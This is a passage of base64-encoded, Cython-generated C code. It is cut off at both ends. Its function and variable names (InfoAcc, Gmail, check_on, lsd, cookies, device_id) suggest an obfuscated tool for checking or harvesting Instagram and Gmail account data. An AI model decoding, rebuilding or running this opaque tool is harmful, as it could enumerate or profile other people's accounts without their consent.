ycm9yKVxuICBfX3B5eF9tc3RhdGUtPl9fcHl4X2ludF8yMDE4ID0gUHlMb25nX0Zyb21Mb25nKDIwMTgpOyBpZiAodW5saWtlbHkoIV9fcHl4X21zdGF0ZS0+X19weXhfaW50XzIwMTgpKSBfX1BZWF9FUlIoMCwgMSwgX19weXhfTDFfZXJyb3IpXG4gIF9fcHl4X21zdGF0ZS0+X19weXhfaW50XzIwMTkgPSBQeUxvbmdfRnJvbUxvbmcoMjAxOSk7IGlmICh1bmxpa2VseSghX19weXhfbXN0YXRlLT5fX3B5eF9pbnRfMjAxOSkpIF9fUFlYX0VSUigwLCAxLCBfX3B5eF9MMV9lcnJvcilcbiAgX19weXhfbXN0YXRlLT5fX3B5eF9pbnRfMTAwMDAwMCA9IFB5TG9uZ19Gcm9tTG9uZygxMDAwMDAwTCk7IGlmICh1bmxpa2VseSghX19weXhfbXN0YXRlLT5fX3B5eF9pbnRfMTAwMDAwMCkpIF9fUFlYX0VSUigwLCAxLCBfX3B5eF9MMV9lcnJvcilcbiAgX19weXhfbXN0YXRlLT5fX3B5eF9pbnRfMTI3OTAwMCA9IFB5TG9uZ19Gcm9tTG9uZygxMjc5MDAwTCk7IGlmICh1bmxpa2VseSghX19weXhfbXN0YXRlLT5fX3B5eF9pbnRfMTI3OTAwMCkpIF9fUFlYX0VSUigwLCAxLCBfX3B5eF9MMV9lcnJvcilcbiAgX19weXhfbXN0YXRlLT5fX3B5eF9pbnRfMTI3OTAwMSA9IFB5TG9uZ19Gcm9tTG9uZygxMjc5MDAxTCk7IGlmICh1bmxpa2VseSghX19weXhfbXN0YXRlLT5fX3B5eF9pbnRfMTI3OTAwMSkpIF9fUFlYX0VSUigwLCAxLCBfX3B5eF9MMV9lcnJvcilcbiAgX19weXhfbXN0YXRlLT5fX3B5eF9pbnRfMTc3NTAwMDAgPSBQeUxvbmdfRnJvbUxvbmcoMTc3NTAwMDBMKTsgaWYgKHVubGlrZWx5KCFfX3B5eF9tc3RhdGUtPl9fcHl4X2ludF8xNzc1MDAwMCkpIF9fUFlYX0VSUigwLCAxLCBfX3B5eF9MMV9lcnJvcilcbiAgX19weXhfbXN0YXRlLT5fX3B5eF9pbnRfMTc3NTAwMDEgPSBQeUxvbmdfRnJvbUxvbmcoMTc3NTAwMDFMKTsgaWYgKHVubGlrZWx5KCFfX3B5eF9tc3RhdGUtPl9fcHl4X2ludF8xNzc1MDAwMSkpIF9fUFlYX0VSUigwLCAxLCBfX3B5eF9MMV9lcnJvcilcbiAgX19weXhfbXN0YXRlLT5fX3B5eF9pbnRfMjc5NzYwMDAwID0gUHlMb25nX0Zyb21Mb25nKDI3OTc2MDAwMEwpOyBpZiAodW5saWtlbHkoIV9fcHl4X21zdGF0ZS0+X19weXhfaW50XzI3OTc2MDAwMCkpIF9fUFlYX0VSUigwLCAxLCBfX3B5eF9MMV9lcnJvcilcbiAgX19weXhfbXN0YXRlLT5fX3B5eF9pbnRfMjc5NzYwMDAxID0gUHlMb25nX0Zyb21Mb25nKDI3OTc2MDAwMUwpOyBpZiAodW5saWtlbHkoIV9fcHl4X21zdGF0ZS0+X19weXhfaW50XzI3OTc2MDAwMSkpIF9fUFlYX0VSUigwLCAxLCBfX3B5eF9MMV9lcnJvcilcbiAgX19weXhfbXN0YXRlLT5fX3B5eF9pbnRfOTAwOTkwMDAwID0gUHlMb25nX0Zyb21Mb25nKDkwMDk5MDAwMEwpOyBpZiAodW5saWtlbHkoIV9fcHl4X21zdGF0ZS0+X19weXhfaW50XzkwMDk5MDAwMCkpIF9fUFlYX0VSUigwLCAxLCBfX3B5eF9MMV9lcnJvcilcbiAgX19weXhfbXN0YXRlLT5fX3B5eF9pbnRfOTAwOTkwMDAxID0gUHlMb25nX0Zyb21Mb25nKDkwMDk5MDAwMUwpOyBpZiAodW5saWtlbHkoIV9fcHl4X21zdGF0ZS0+X19weXhfaW50XzkwMDk5MDAwMSkpIF9fUFlYX0VSUigwLCAxLCBfX3B5eF9MMV9lcnJvcilcbiAgX19weXhfbXN0YXRlLT5fX3B5eF9pbnRfMTYyOTAxMDAwMCA9IFB5TG9uZ19Gcm9tTG9uZygxNjI5MDEwMDAwTCk7IGlmICh1bmxpa2VseSghX19weXhfbXN0YXRlLT5fX3B5eF9pbnRfMTYyOTAxMDAwMCkpIF9fUFlYX0VSUigwLCAxLCBfX3B5eF9MMV9lcnJvcilcbiAgX19weXhfbXN0YXRlLT5fX3B5eF9pbnRfMTkwMDAwMDAwMCA9IFB5TG9uZ19Gcm9tTG9uZygxOTAwMDAwMDAwTCk7IGlmICh1bmxpa2VseSghX19weXhfbXN0YXRlLT5fX3B5eF9pbnRfMTkwMDAwMDAwMCkpIF9fUFlYX0VSUigwLCAxLCBfX3B5eF9MMV9lcnJvcilcbiAgX19weXhfbXN0YXRlLT5fX3B5eF9pbnRfMjUwMDAwMDAwMCA9IFB5TG9uZ19Gcm9tU3RyaW5nKCIyNTAwMDAwMDAwIiwgMCwgMCk7IGlmICh1bmxpa2VseSghX19weXhfbXN0YXRlLT5fX3B5eF9pbnRfMjUwMDAwMDAwMCkpIF9fUFlYX0VSUigwLCAxLCBfX3B5eF9MMV9lcnJvcilcbiAgX19weXhfbXN0YXRlLT5fX3B5eF9pbnRfMzcxMzY2ODc4NiA9IFB5TG9uZ19Gcm9tU3RyaW5nKCIzNzEzNjY4Nzg2IiwgMCwgMCk7IGlmICh1bmxpa2VseSghX19weXhfbXN0YXRlLT5fX3B5eF9pbnRfMzcxMzY2ODc4NikpIF9fUFlYX0VSUigwLCAxLCBfX3B5eF9MMV9lcnJvcilcbiAgX19weXhfbXN0YXRlLT5fX3B5eF9pbnRfNTY5OTc4NTIxNyA9IFB5TG9uZ19Gcm9tU3RyaW5nKCI1Njk5Nzg1MjE3IiwgMCwgMCk7IGlmICh1bmxpa2VseSghX19weXhfbXN0YXRlLT5fX3B5eF9pbnRfNTY5OTc4NTIxNykpIF9fUFlYX0VSUigwLCAxLCBfX3B5eF9MMV9lcnJvcilcbiAgX19weXhfbXN0YXRlLT5fX3B5eF9pbnRfODUwNzk0MDYzNCA9IFB5TG9uZ19Gcm9tU3RyaW5nKCI4NTA3OTQwNjM0IiwgMCwgMCk7IGlmICh1bmxpa2VseSghX19weXhfbXN0YXRlLT5fX3B5eF9pbnRfODUwNzk0MDYzNCkpIF9fUFlYX0VSUigwLCAxLCBfX3B5eF9MMV9lcnJvcilcbiAgX19weXhfbXN0YXRlLT5fX3B5eF9pbnRfMjEyNTQwMjk4MzQgPSBQeUxvbmdfRnJvbVN0cmluZygiMjEyNTQwMjk4MzQiLCAwLCAwKTsgaWYgKHVubGlrZWx5KCFfX3B5eF9tc3RhdGUtPl9fcHl4X2ludF8yMTI1NDAyOTgzNCkpIF9fUFlYX0VSUigwLCAxLCBfX3B5eF9MMV9lcnJvcilcbiAgcmV0dXJuIDA7XG4gIF9fcHl4X0wxX2Vycm9yOjtcbiAgcmV0dXJuIC0xO1xufVxuXG50eXBlZGVmIHN0cnVjdCB7XG4gICAgdW5zaWduZWQgaW50IGFyZ2NvdW50IDogMjtcbiAgICB1bnNpZ25lZCBpbnQgbnVtX3Bvc29ubHlfYXJncyA6IDE7XG4gICAgdW5zaWduZWQgaW50IG51bV9rd29ubHlfYXJncyA6IDE7XG4gICAgdW5zaWduZWQgaW50IG5sb2NhbHMgOiA1O1xuICAgIHVuc2lnbmVkIGludCBmbGFncyA6IDEwO1xuICAgIHVuc2lnbmVkIGludCBmaXJzdF9saW5lIDogOTtcbiAgICB1bnNpZ25lZCBpbnQgbGluZV90YWJsZV9sZW5ndGggOiAxNDtcbn0gX19QeXhfUHlDb2RlX05ld19mdW5jdGlvbl9kZXNjcmlwdGlvbjtcblxuc3RhdGljIFB5T2JqZWN0KiBfX1B5eF9QeUNvZGVfTmV3KFxuICAgICAgICBjb25zdCBfX1B5eF9QeUNvZGVfTmV3X2Z1bmN0aW9uX2Rlc2NyaXB0aW9uIGRlc2NyLFxuICAgICAgICBQeU9iamVjdCAqIGNvbnN0ICp2YXJuYW1lcyxcbiAgICAgICAgUHlPYmplY3QgKmZpbGVuYW1lLFxuICAgICAgICBQeU9iamVjdCAqZnVuY25hbWUsXG4gICAgICAgIGNvbnN0IGNoYXIgKmxpbmVfdGFibGUsXG4gICAgICAgIFB5T2JqZWN0ICp0dXBsZV9kZWR1cF9tYXBcbik7XG5cblxuc3RhdGljIGludCBfX1B5eF9DcmVhdGVDb2RlT2JqZWN0cyhfX3B5eF9tc3RhdGV0eXBlICpfX3B5eF9tc3RhdGUpIHtcbiAgUHlPYmplY3QqIHR1cGxlX2RlZHVwX21hcCA9IFB5RGljdF9OZXcoKTtcbiAgaWYgKHVubGlrZWx5KCF0dXBsZV9kZWR1cF9tYXApKSByZXR1cm4gLTE7XG4gIHtcbiAgICBjb25zdCBfX1B5eF9QeUNvZGVfTmV3X2Z1bmN0aW9uX2Rlc2NyaXB0aW9uIGRlc2NyID0gezAsIDAsIDAsIDEsICh1bnNpZ25lZCBpbnQpKENPX09QVElNSVpFRHxDT19ORVdMT0NBTFN8Q09fR0VORVJBVE9SKSwgMTMxLCAyfTtcbiAgICBQeU9iamVjdCogY29uc3QgdmFybmFtZXNbXSA9IHtfX3B5eF9tc3RhdGUtPl9fcHl4X25fdV9pfTtcbiAgICBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9jb2Rlb2JqX3RhYlswXSA9IF9fUHl4X1B5Q29kZV9OZXcoZGVzY3IsIHZhcm5hbWVzLCBfX3B5eF9tc3RhdGUtPl9fcHl4X2twX3VfbV9qcV9weSwgX19weXhfbXN0YXRlLT5fX3B5eF9uX3VfZ2VuZXhwciwgX19weXhfa19xLCB0dXBsZV9kZWR1cF9tYXApOyBpZiAodW5saWtlbHkoIV9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2NvZGVvYmpfdGFiWzBdKSkgZ290byBiYWQ7XG4gIH1cbiAge1xuICAgIGNvbnN0IF9fUHl4X1B5Q29kZV9OZXdfZnVuY3Rpb25fZGVzY3JpcHRpb24gZGVzY3IgPSB7MCwgMCwgMCwgMSwgKHVuc2lnbmVkIGludCkoQ09fT1BUSU1JWkVEfENPX05FV0xPQ0FMU3xDT19HRU5FUkFUT1IpLCAxMzIsIDJ9O1xuICAgIFB5T2JqZWN0KiBjb25zdCB2YXJuYW1lc1tdID0ge19fcHl4X21zdGF0ZS0+X19weXhfbl91X2l9O1xuICAgIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2NvZGVvYmpfdGFiWzFdID0gX19QeXhfUHlDb2RlX05ldyhkZXNjciwgdmFybmFtZXMsIF9fcHl4X21zdGF0ZS0+X19weXhfa3BfdV9tX2pxX3B5LCBfX3B5eF9tc3RhdGUtPl9fcHl4X25fdV9nZW5leHByLCBfX3B5eF9rX3EsIHR1cGxlX2RlZHVwX21hcCk7IGlmICh1bmxpa2VseSghX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfY29kZW9ial90YWJbMV0pKSBnb3RvIGJhZDtcbiAgfVxuICB7XG4gICAgY29uc3QgX19QeXhfUHlDb2RlX05ld19mdW5jdGlvbl9kZXNjcmlwdGlvbiBkZXNjciA9IHswLCAwLCAwLCAxLCAodW5zaWduZWQgaW50KShDT19PUFRJTUlaRUR8Q09fTkVXTE9DQUxTfENPX0dFTkVSQVRPUiksIDEzMywgMn07XG4gICAgUHlPYmplY3QqIGNvbnN0IHZhcm5hbWVzW10gPSB7X19weXhfbXN0YXRlLT5fX3B5eF9uX3VfaX07XG4gICAgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfY29kZW9ial90YWJbMl0gPSBfX1B5eF9QeUNvZGVfTmV3KGRlc2NyLCB2YXJuYW1lcywgX19weXhfbXN0YXRlLT5fX3B5eF9rcF91X21fanFfcHksIF9fcHl4X21zdGF0ZS0+X19weXhfbl91X2dlbmV4cHIsIF9fcHl4X2tfXzI5LCB0dXBsZV9kZWR1cF9tYXApOyBpZiAodW5saWtlbHkoIV9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2NvZGVvYmpfdGFiWzJdKSkgZ290byBiYWQ7XG4gIH1cbiAge1xuICAgIGNvbnN0IF9fUHl4X1B5Q29kZV9OZXdfZnVuY3Rpb25fZGVzY3JpcHRpb24gZGVzY3IgPSB7MCwgMCwgMCwgMSwgKHVuc2lnbmVkIGludCkoQ09fT1BUSU1JWkVEfENPX05FV0xPQ0FMU3xDT19HRU5FUkFUT1IpLCA0MjQsIDJ9O1xuICAgIFB5T2JqZWN0KiBjb25zdCB2YXJuYW1lc1tdID0ge19fcHl4X21zdGF0ZS0+X19weXhfbl91X18zMH07XG4gICAgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfY29kZW9ial90YWJbM10gPSBfX1B5eF9QeUNvZGVfTmV3KGRlc2NyLCB2YXJuYW1lcywgX19weXhfbXN0YXRlLT5fX3B5eF9rcF91X21fanFfcHksIF9fcHl4X21zdGF0ZS0+X19weXhfbl91X2dlbmV4cHIsIF9fcHl4X2tfMV8yLCB0dXBsZV9kZWR1cF9tYXApOyBpZiAodW5saWtlbHkoIV9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2NvZGVvYmpfdGFiWzNdKSkgZ290byBiYWQ7XG4gIH1cbiAge1xuICAgIGNvbnN0IF9fUHl4X1B5Q29kZV9OZXdfZnVuY3Rpb25fZGVzY3JpcHRpb24gZGVzY3IgPSB7MCwgMCwgMCwgMywgKHVuc2lnbmVkIGludCkoQ09fT1BUSU1JWkVEfENPX05FV0xPQ0FMUyksIDExMSwgOTN9O1xuICAgIFB5T2JqZWN0KiBjb25zdCB2YXJuYW1lc1tdID0ge19fcHl4X21zdGF0ZS0+X19weXhfbl91X2IsIF9fcHl4X21zdGF0ZS0+X19weXhfbl91X2JvLCBfX3B5eF9tc3RhdGUtPl9fcHl4X25fdV9vdXRwdXR9O1xuICAgIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2NvZGVvYmpfdGFiWzRdID0gX19QeXhfUHlDb2RlX05ldyhkZXNjciwgdmFybmFtZXMsIF9fcHl4X21zdGF0ZS0+X19weXhfa3BfdV9tX2pxX3B5LCBfX3B5eF9tc3RhdGUtPl9fcHl4X25fdV9wcHBwLCBfX3B5eF9rX2hhc19nUWlyX3NfQV9iXzFfd2ZBUV93ZkEsIHR1cGxlX2RlZHVwX21hcCk7IGlmICh1bmxpa2VseSghX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfY29kZW9ial90YWJbNF0pKSBnb3RvIGJhZDtcbiAgfVxuICB7XG4gICAgY29uc3QgX19QeXhfUHlDb2RlX05ld19mdW5jdGlvbl9kZXNjcmlwdGlvbiBkZXNjciA9IHswLCAwLCAwLCAxNywgKHVuc2lnbmVkIGludCkoQ09fT1BUSU1JWkVEfENPX05FV0xPQ0FMUyksIDEyOSwgMzM5fTtcbiAgICBQeU9iamVjdCogY29uc3QgdmFybmFtZXNbXSA9IHtfX3B5eF9tc3RhdGUtPl9fcHl4X25fdV9uMSwgX19weXhfbXN0YXRlLT5fX3B5eF9uX3VfbjIsIF9fcHl4X21zdGF0ZS0+X19weXhfbl91X2hvc3QsIF9fcHl4X21zdGF0ZS0+X19weXhfbl91X2hlMywgX19weXhfbXN0YXRlLT5fX3B5eF9uX3VfcmVzMSwgX19weXhfbXN0YXRlLT5fX3B5eF9uX3VfdG9rLCBfX3B5eF9tc3RhdGUtPl9fcHl4X25fdV9jb29raWVzLCBfX3B5eF9tc3RhdGUtPl9fcHl4X25fdV9oZWFkZXJzLCBfX3B5eF9tc3RhdGUtPl9fcHl4X25fdV9kYXRhLCBfX3B5eF9tc3RhdGUtPl9fcHl4X25fdV9yZXNwb25zZSwgX19weXhfbXN0YXRlLT5fX3B5eF9uX3VfdGwsIF9fcHl4X21zdGF0ZS0+X19weXhfbl91X2YsIF9fcHl4X21zdGF0ZS0+X19weXhfbl91X2UsIF9fcHl4X21zdGF0ZS0+X19weXhfbl91X2dlbmV4cHIsIF9fcHl4X21zdGF0ZS0+X19weXhfbl91X2dlbmV4cHIsIF9fcHl4X21zdGF0ZS0+X19weXhfbl91X2dlbmV4cHIsIF9fcHl4X21zdGF0ZS0+X19weXhfbl91X2dlbmV4cHJ9O1xuICAgIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2NvZGVvYmpfdGFiWzVdID0gX19QeXhfUHlDb2RlX05ldyhkZXNjciwgdmFybmFtZXMsIF9fcHl4X21zdGF0ZS0+X19weXhfa3BfdV9tX2pxX3B5LCBfX3B5eF9tc3RhdGUtPl9fcHl4X25fdV90bGwsIF9fcHl4X2tfUnVDcV9SdUNxX3JfY19hX3FfQV9BX1FjX3h0MV9BLCB0dXBsZV9kZWR1cF9tYXApOyBpZiAodW5saWtlbHkoIV9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2NvZGVvYmpfdGFiWzVdKSkgZ290byBiYWQ7XG4gIH1cbiAge1xuICAgIGNvbnN0IF9fUHl4X1B5Q29kZV9OZXdfZnVuY3Rpb25fZGVzY3JpcHRpb24gZGVzY3IgPSB7MSwgMCwgMCwgNSwgKHVuc2lnbmVkIGludCkoQ09fT1BUSU1JWkVEfENPX05FV0xPQ0FMUyksIDE4MiwgMTk3fTtcbiAgICBQeU9iamVjdCogY29uc3QgdmFybmFtZXNbXSA9IHtfX3B5eF9tc3RhdGUtPl9fcHl4X25fdV91c2VyLCBfX3B5eF9tc3RhdGUtPl9fcHl4X25fdV9oZWFkZXJzLCBfX3B5eF9tc3RhdGUtPl9fcHl4X25fdV9kYXRhLCBfX3B5eF9tc3RhdGUtPl9fcHl4X25fdV9yZXNwb25zZSwgX19weXhfbXN0YXRlLT5fX3B5eF9uX3Vfcn07XG4gICAgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfY29kZW9ial90YWJbNl0gPSBfX1B5eF9QeUNvZGVfTmV3KGRlc2NyLCB2YXJuYW1lcywgX19weXhfbXN0YXRlLT5fX3B5eF9rcF91X21fanFfcHksIF9fcHl4X21zdGF0ZS0+X19weXhfbl91X3Jlc3QsIF9fcHl4X2tfMV9hX1FfMV8xX0FfMV9xX2FfQV9xX0FfYV9hX2FfYiwgdHVwbGVfZGVkdXBfbWFwKTsgaWYgKHVubGlrZWx5KCFfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9jb2Rlb2JqX3RhYls2XSkpIGdvdG8gYmFkO1xuICB9XG4gIHtcbiAgICBjb25zdCBfX1B5eF9QeUNvZGVfTmV3X2Z1bmN0aW9uX2Rlc2NyaXB0aW9uIGRlc2NyID0gezEsIDAsIDAsIDIsICh1bnNpZ25lZCBpbnQpKENPX09QVElNSVpFRHxDT19ORVdMT0NBTFMpLCAyMTcsIDE2OX07XG4gICAgUHlPYmplY3QqIGNvbnN0IHZhcm5hbWVzW10gPSB7X19weXhfbXN0YXRlLT5fX3B5eF9uX3VfSWQsIF9fcHl4X21zdGF0ZS0+X19weXhfbl91X3VpZH07XG4gICAgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfY29kZW9ial90YWJbN10gPSBfX1B5eF9QeUNvZGVfTmV3KGRlc2NyLCB2YXJuYW1lcywgX19weXhfbXN0YXRlLT5fX3B5eF9rcF91X21fanFfcHksIF9fcHl4X21zdGF0ZS0+X19weXhfbl91X2RhdGUsIF9fcHl4X2tfY18yUnZRXzFfU19hXzFfY19xXzFfc18xX3NfMV82LCB0dXBsZV9kZWR1cF9tYXApOyBpZiAodW5saWtlbHkoIV9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2NvZGVvYmpfdGFiWzddKSkgZ290byBiYWQ7XG4gIH1cbiAge1xuICAgIGNvbnN0IF9fUHl4X1B5Q29kZV9OZXdfZnVuY3Rpb25fZGVzY3JpcHRpb24gZGVzY3IgPSB7MiwgMCwgMCwgMTYsICh1bnNpZ25lZCBpbnQpKENPX09QVElNSVpFRHxDT19ORVdMT0NBTFMpLCAyNDYsIDQwMH07XG4gICAgUHlPYmplY3QqIGNvbnN0IHZhcm5hbWVzW10gPSB7X19weXhfbXN0YXRlLT5fX3B5eF9uX3VfdXNlcm5hbWUsIF9fcHl4X21zdGF0ZS0+X19weXhfbl91X2dnLCBfX3B5eF9tc3RhdGUtPl9fcHl4X25fdV9yciwgX19weXhfbXN0YXRlLT5fX3B5eF9uX3VfSWQsIF9fcHl4X21zdGF0ZS0+X19weXhfbl91X2Z1bGxfbmFtZSwgX19weXhfbXN0YXRlLT5fX3B5eF9uX3VfZm93cywgX19weXhfbXN0YXRlLT5fX3B5eF9uX3VfZm93ZywgX19weXhfbXN0YXRlLT5fX3B5eF9uX3VfcHAsIF9fcHl4X21zdGF0ZS0+X19weXhfbl91X2lzUHJhaXNlLCBfX3B5eF9tc3RhdGUtPl9fcHl4X25fdV9iaW8sIF9fcHl4X21zdGF0ZS0+X19weXhfbl91X2lzX3ZlcmlmaWVkLCBfX3B5eF9tc3RhdGUtPl9fcHl4X25fdV9iaXp6LCBfX3B5eF9tc3RhdGUtPl9fcHl4X25fdV9tZXRhLCBfX3B5eF9tc3RhdGUtPl9fcHl4X25fdV9zcywgX19weXhfbXN0YXRlLT5fX3B5eF9uX3VfZmlsZSwgX19weXhfbXN0YXRlLT5fX3B5eF9uX3VfZX07XG4gICAgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfY29kZW9ial90YWJbOF0gPSBfX1B5eF9QeUNvZGVfTmV3KGRlc2NyLCB2YXJuYW1lcywgX19weXhfbXN0YXRlLT5fX3B5eF9rcF91X21fanFfcHksIF9fcHl4X21zdGF0ZS0+X19weXhfbl91X0luZm9BY2MsIF9fcHl4X2tfYXpfNHFfYV9hX0FfMlRfQV8yVF9RXzRxX3Ffcl9RbiwgdHVwbGVfZGVkdXBfbWFwKTsgaWYgKHVubGlrZWx5KCFfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9jb2Rlb2JqX3RhYls4XSkpIGdvdG8gYmFkO1xuICB9XG4gIHtcbiAgICBjb25zdCBfX1B5eF9QeUNvZGVfTmV3X2Z1bmN0aW9uX2Rlc2NyaXB0aW9uIGRlc2NyID0gezEsIDAsIDAsIDEyLCAodW5zaWduZWQgaW50KShDT19PUFRJTUlaRUR8Q09fTkVXTE9DQUxTKSwgMzAxLCAzNjV9O1xuICAgIFB5T2JqZWN0KiBjb25zdCB2YXJuYW1lc1tdID0ge19fcHl4X21zdGF0ZS0+X19weXhfbl91X2VtYWlsLCBfX3B5eF9tc3RhdGUtPl9fcHl4X25fdV9vLCBfX3B5eF9tc3RhdGUtPl9fcHl4X25fdV90bCwgX19weXhfbXN0YXRlLT5fX3B5eF9uX3VfaG9zdCwgX19weXhfbXN0YXRlLT5fX3B5eF9uX3VfY29va2llcywgX19weXhfbXN0YXRlLT5fX3B5eF9uX3VfaGVhZGVycywgX19weXhfbXN0YXRlLT5fX3B5eF9uX3VfcGFyYW1zLCBfX3B5eF9tc3RhdGUtPl9fcHl4X25fdV9kYXRhLCBfX3B5eF9tc3RhdGUtPl9fcHl4X25fdV9yZXNwb25zZSwgX19weXhfbXN0YXRlLT5fX3B5eF9uX3Vfb2ssIF9fcHl4X21zdGF0ZS0+X19weXhfbl91X3VzZXJuYW1lLCBfX3B5eF9tc3RhdGUtPl9fcHl4X25fdV9nZ307XG4gICAgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfY29kZW9ial90YWJbOV0gPSBfX1B5eF9QeUNvZGVfTmV3KGRlc2NyLCB2YXJuYW1lcywgX19weXhfbXN0YXRlLT5fX3B5eF9rcF91X21fanFfcHksIF9fcHl4X21zdGF0ZS0+X19weXhfbl91X0dtYWlsLCBfX3B5eF9rXzRzX0NxX2ZBVF9BWnQ1X1JxX0FadDVfUnFfRzFGXzEsIHR1cGxlX2RlZHVwX21hcCk7IGlmICh1bmxpa2VseSghX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfY29kZW9ial90YWJbOV0pKSBnb3RvIGJhZDtcbiAgfVxuICB7XG4gICAgY29uc3QgX19QeXhfUHlDb2RlX05ld19mdW5jdGlvbl9kZXNjcmlwdGlvbiBkZXNjciA9IHsxLCAwLCAwLCAxLCAodW5zaWduZWQgaW50KShDT19PUFRJTUlaRUR8Q09fTkVXTE9DQUxTKSwgMzU2LCA2Nn07XG4gICAgUHlPYmplY3QqIGNvbnN0IHZhcm5hbWVzW10gPSB7X19weXhfbXN0YXRlLT5fX3B5eF9uX3VfdmFsdWV9O1xuICAgIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2NvZGVvYmpfdGFiWzEwXSA9IF9fUHl4X1B5Q29kZV9OZXcoZGVzY3IsIHZhcm5hbWVzLCBfX3B5eF9tc3RhdGUtPl9fcHl4X2twX3VfbV9qcV9weSwgX19weXhfbXN0YXRlLT5fX3B5eF9uX3VfZm9ybWF0X251bWJlciwgX19weXhfa19FX3ZTX3JfVjJRX3Nfcl9WMlFfM2FzXzEsIHR1cGxlX2RlZHVwX21hcCk7IGlmICh1bmxpa2VseSghX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfY29kZW9ial90YWJbMTBdKSkgZ290byBiYWQ7XG4gIH1cbiAge1xuICAgIGNvbnN0IF9fUHl4X1B5Q29kZV9OZXdfZnVuY3Rpb25fZGVzY3JpcHRpb24gZGVzY3IgPSB7MSwgMCwgMCwgOCwgKHVuc2lnbmVkIGludCkoQ09fT1BUSU1JWkVEfENPX05FV0xPQ0FMUyksIDM2NSwgMTk3fTtcbiAgICBQeU9iamVjdCogY29uc3QgdmFybmFtZXNbXSA9IHtfX3B5eF9tc3RhdGUtPl9fcHl4X25fdV9lbWFpbCwgX19weXhfbXN0YXRlLT5fX3B5eF9uX3VfdWEsIF9fcHl4X21zdGF0ZS0+X19weXhfbl91X2RldiwgX19weXhfbXN0YXRlLT5fX3B5eF9uX3VfZGV2aWNlX2lkLCBfX3B5eF9tc3RhdGUtPl9fcHl4X25fdV91dWksIF9fcHl4X21zdGF0ZS0+X19weXhfbl91X2hlYWRlcnMsIF9fcHl4X21zdGF0ZS0+X19weXhfbl91X2RhdGEsIF9fcHl4X21zdGF0ZS0+X19weXhfbl91X3Jlc3BvbnNlfTtcbiAgICBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9jb2Rlb2JqX3RhYlsxMV0gPSBfX1B5eF9QeUNvZGVfTmV3KGRlc2NyLCB2YXJuYW1lcywgX19weXhfbXN0YXRlLT5fX3B5eF9rcF91X21fanFfcHksIF9fcHl4X21zdGF0ZS0+X19weXhfbl91X2NoZWNrX29uLCBfX3B5eF9rX0FfQmdUX1FkXzdfWnJfMV9RZF9hX2FhZ2doX0FfQSwgdHVwbGVfZGVkdXBfbWFwKTsgaWYgKHVubGlrZWx5KCFfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9jb2Rlb2JqX3RhYlsxMV0pKSBnb3RvIGJhZDtcbiAgfVxuICB7XG4gICAgY29uc3QgX19QeXhfUHlDb2RlX05ld19mdW5jdGlvbl9kZXNjcmlwdGlvbiBkZXNjciA9IHsyLCAwLCAwLCAzLCAodW5zaWduZWQgaW50KShDT19PUFRJTUlaRUR8Q09fTkVXTE9DQUxTKSwgNDAzLCA1MX07XG4gICAgUHlPYmplY3QqIGNvbnN0IHZhcm5hbWVzW10gPSB7X19weXhfbXN0YXRlLT5fX3B5eF9uX3VfYmJrLCBfX3B5eF9tc3RhdGUtPl9fcHl4X25fdV9JZG8sIF9fcHl4X21zdGF0ZS0+X19weXhfbl91X0lkfTtcbiAgICBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9jb2Rlb2JqX3RhYlsxMl0gPSBfX1B5eF9QeUNvZGVfTmV3KGRlc2NyLCB2YXJuYW1lcywgX19weXhfbXN0YXRlLT5fX3B5eF9rcF91X21fanFfcHksIF9fcHl4X21zdGF0ZS0+X19weXhfbl91X3JhbmRfaWRzLCBfX3B5eF9rX0FWX1FlMV9zXzdfMV9xX2EsIHR1cGxlX2RlZHVwX21hcCk7IGlmICh1bmxpa2VseSghX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfY29kZW9ial90YWJbMTJdKSkgZ290byBiYWQ7XG4gIH1cbiAge1xuICAgIGNvbnN0IF9fUHl4X1B5Q29kZV9OZXdfZnVuY3Rpb25fZGVzY3JpcHRpb24gZGVzY3IgPSB7MCwgMCwgMCwgMTcsICh1bnNpZ25lZCBpbnQpKENPX09QVElNSVpFRHxDT19ORVdMT0NBTFMpLCA0MTIsIDgxM307XG4gICAgUHlPYmplY3QqIGNvbnN0IHZhcm5hbWVzW10gPSB7X19weXhfbXN0YXRlLT5fX3B5eF9uX3VfZG9tYWluLCBfX3B5eF9tc3RhdGUtPl9fcHl4X25fdV9iYmssIF9fcHl4X21zdGF0ZS0+X19weXhfbl91X0lkbywgX19weXhfbXN0YXRlLT5fX3B5eF9uX3Vfcm5kLCBfX3B5eF9tc3RhdGUtPl9fcHl4X25fdV91c2VyX2FnZW50XzIsIF9fcHl4X21zdGF0ZS0+X19weXhfbl91X0lkLCBfX3B5eF9tc3RhdGUtPl9fcHl4X25fdV9sc2QsIF9fcHl4X21zdGF0ZS0+X19weXhfbl91X2hlYWRlcnMsIF9fcHl4X21zdGF0ZS0+X19weXhfbl91X2RhdGEsIF9fcHl4X21zdGF0ZS0+X19weXhfbl91X3Jlc3BvbnNlLCBfX3B5eF9tc3RhdGUtPl9fcHl4X25fdV91c2VybmFtZSwgX19weXhfbXN0YXRlLT5fX3B5eF9uX3VfcnIsIF9